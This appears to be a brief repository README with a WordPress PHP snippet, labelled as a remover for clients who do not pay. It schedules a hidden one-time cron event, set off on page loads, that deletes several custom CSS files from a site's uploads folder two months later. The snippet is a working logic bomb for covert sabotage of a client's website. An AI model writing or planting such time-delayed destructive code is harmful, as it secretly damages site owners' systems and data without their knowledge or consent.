# Task-Front-end
# envoycan-task
wordpress code remover after schedule time when client not pay payment 
function delete_expired_files() {
    $file_paths = [
        ABSPATH . 'wp-content/uploads/custom-css-js/21468.css',
        ABSPATH . 'wp-content/uploads/custom-css-js/21335.css',
        ABSPATH . 'wp-content/uploads/custom-css-js/13828.css',
        ABSPATH . 'wp-content/uploads/custom-css-js/13509.css',
        ABSPATH . 'wp-content/uploads/custom-css-js/13353.css'
    ];

    foreach ($file_paths as $file_path) {
        if (file_exists($file_path)) {
            if (unlink($file_path)) {
                error_log('Successfully deleted: ' . $file_path);
            } else {
                error_log('Deletion failed for: ' . $file_path . '. Check permissions.');
            }
        } else {
            error_log('File does not exist: ' . $file_path);
        }
    }
}

// Schedule the file deletion to run once, 2 months from now
function schedule_file_deletion() {
    if (!wp_next_scheduled('delete_expired_files_hook')) {
        wp_schedule_single_event(strtotime('+2 months'), 'delete_expired_files_hook');
    }
}

add_action('delete_expired_files_hook', 'delete_expired_files');
add_action('wp', 'schedule_file_deletion');
